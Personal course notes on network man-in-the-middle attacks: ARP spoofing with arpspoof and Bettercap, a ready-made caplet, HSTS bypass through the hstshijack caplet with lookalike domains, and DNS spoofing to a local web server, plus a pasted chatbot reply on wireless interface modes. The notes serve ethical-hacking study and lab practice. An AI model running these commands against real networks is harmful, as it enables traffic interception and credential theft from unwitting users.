
https://drive.google.com/file/d/1vDtlRctvO7HUeQRSdTqDubAyiPN2uObY/view?usp=drive_web


[https://drive.google.com/file/d/1vDtlRctvO7HUeQRSdTqDubAyiPN2uObY/view?usp=drive_web](https://drive.google.com/file/d/1vDtlRctvO7HUeQRSdTqDubAyiPN2uObY/view?usp=drive_web)

# **section 11 (Address resolution protocol spoofing)**

ARP basically provides Ip addresses to a mac addresses in a network

arp -n

- to perform arpspoofing using tool called ( arpspoof )
    
- (in this we take victim machine packets to our machine) V37
    
    C:\home\kali> sudo su
    
    [sudo] password for kali: ┌──(root㉿kali)-[/home/kali] └─# **arpspoof -i wlan1 -t 192.168.10.105 192.168.10.1**
    
- (by this we take routers packets to our machine) V38
    
    C:\home\kali> sudo su
    
    [sudo] password for kali: ┌──(root㉿kali)-[/home/kali] └─# **arpspoof -i wlan1 -t 192.168.10.1 192.168.10.105**
    
- (command to forward victims packets to router )
    
    (root㉿kali)-[/home/kali] └─# sudo echo 1 > /proc/sys/net/ipv4/ip_forward
    
- using Bettercap tool for arpspoofing (V39)
    
    (root㉿kali)-[/home/kali] └─**# bettercap -iface wlan0**
    
    **» net.probe on**
    
    **» net.show**
    
    > > help
    
    V40
    
    » help arp.spoof
    
    » set arp.spoof.fullduplex true (both victim machine and router are spoofed by using this command)
    
    > > set arp.spoof.targets 192.168.10.105
    
    » arp.spoof on
    
    » help net.sniff
    
    » net.sniff on
    
    - Video 42 Creating Custom Spoofing Script
        
        (All Bettercap command to run an arp spoofing attack)
        
        net.probe on
        
        set arp.spoof.fullduplex true
        
        set arp.spoof.targets 192.168.10.102
        
        arp.spoof on
        
        set net.sniff.local true
        
        net.sniff on
        
        Here's a revised sequence of commands based on your scenario:
        
        [root㉿kali]-[/home/kali] └─# bettercap -iface wlan0
        
        » set arp.spoof.fullduplex true
        
        » arp.spoof on
        
        » set net.sniff.local true
        
        » net.sniff on
        
        OR just make a arpspoof.cap file with above content and save it in root folder and run bettercap with this command:-
        
        bettercap -iface wlan0 -caplet arpspoof.cap
        
    
    ## but monitor mode cant connect with wifi then how
    
    ![https://www.gstatic.com/lamda/images/sparkle_resting_v2_darkmode_2bdb7df2724e450073ede.gif](https://www.gstatic.com/lamda/images/sparkle_resting_v2_darkmode_2bdb7df2724e450073ede.gif)
    
    You are correct, a wireless network interface in monitor mode cannot connect to a WiFi network. This is because monitor mode disables the ability of the interface to transmit and receive data, which is necessary for connecting to a WiFi network.
    
    In order to connect to a WiFi network, you need to change the mode of the wireless network interface to managed mode. In managed mode, the interface can transmit and receive data, which is necessary for connecting to a WiFi network.
    
    Once you have connected to a WiFi network, you can then put the interface back into monitor mode to sniff network traffic or to perform other tasks that require monitor mode.
    
    To change the mode of a wireless network interface, you can use the `iwconfig` command. For example, to change the mode of the interface `wlan1` to managed mode, you would run the following command:
    
    `sudo iwconfig wlan1 mode managed`
    
    Once the mode of the interface is changed to managed, you can connect to a WiFi network by providing the network name (SSID) and password.
    
    To put the interface back into monitor mode, you can run the following command:
    
    `sudo iwconfig wlan1 mode monitor`
    
    [https://www.vulnhub.com/entry/hacker-fest-2019,378/](https://www.vulnhub.com/entry/hacker-fest-2019,378/)
    
    - **the arpspoof caplet must have**
        
        net.probe on
        
        set arp.spoof.fullduplex true
        
        set arp.spoof.targets <victims ip address>
        
        arp.spoof on
        
        set net.sniff.local true
        
        net.sniff on
        
        hstshijack/hstshijack —> (caplet work is if there is HTTPS it convert/downgrade it into http)
        
- **V45 Bypassing HSTS**
    
    PWD = /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap
    
    this hstshijack.cap has targets and replacements:-
    
    set hstshijack.targets [google.com](http://google.com/), _.google.com, [gstatic.com](http://gstatic.com/), .gstatic.com,[twitter.com](http://twitter.com/),.twitter.com set hstshijack.replacements google.corn,_.google.corn,gstatic.corn,_.gstatic.corn,[twitter.com](http://twitter.com/),_.twitter.com
    
- **V48 DNS spoofing**
    
    C:\home\kali> service apache2 start (web server that comes with kali) its html file ar in var/www/html
    
    dns.spoof.address : IP address to map the domains to. (default is <your own devices interface address>)
    
    set dns.spoof.all true
    
    set [dns.spoof.domains](http://dns.spoof.domains) [zsecurity.org](http://zsecurity.org),_.zsecurity.org,[gbjbuzz.com](https://www.gbjbuzz.com/),_.gbjbuzz.com
    
    dns.spoof on